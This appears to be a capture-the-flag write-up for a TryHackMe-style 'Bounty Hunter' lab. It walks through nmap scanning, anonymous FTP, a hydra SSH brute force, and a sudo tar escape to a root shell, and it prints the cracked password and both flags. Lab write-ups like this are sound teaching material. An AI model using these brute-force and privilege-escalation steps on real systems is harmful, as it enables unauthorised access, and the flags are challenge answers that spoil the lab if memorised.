# Bounty Hunter 

> You talked a big game about being the most elite hacker in the solar system. Prove it and claim your right to the status of Elite Bounty Hacker!

<br>

Process:
- 1) port scan the machine 
  - `nmap -T4 <ip>`
- 2) aggressive scan the open ports on the machine 
  - `nmap -T4 -A -p 21,22,80 <ip>`
- 3) check anonymous FTP login
  - `ftp <ip>` -> [anonymous] 
  - found: task.txt written by = **lin**
  - found: locks.txt 
  - can try to brute force service with locks.txt = **ssh**
- 4) try to brute force ssh
  - `hydra -u lin -P lock.txt <ip> ssh`
  - found password = **RedDr4gonSynd1cat3**
- 5) login to ssh:
  - look for user.txt
    - `cat user.txt` = **THM{CR1M3_SyNd1C4T3}**
- 6) escalate privileges:
  - find out what sudo commands lin can run: `sudo -l` -> /bin/tar
  - look at GTFOBins for /bin/tar with sudo:
    - found: `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
    - execute to get root shell
  - find root.txt 
    - `cat /root/root.txt` = **THM{80UN7Y_h4cK3r}**


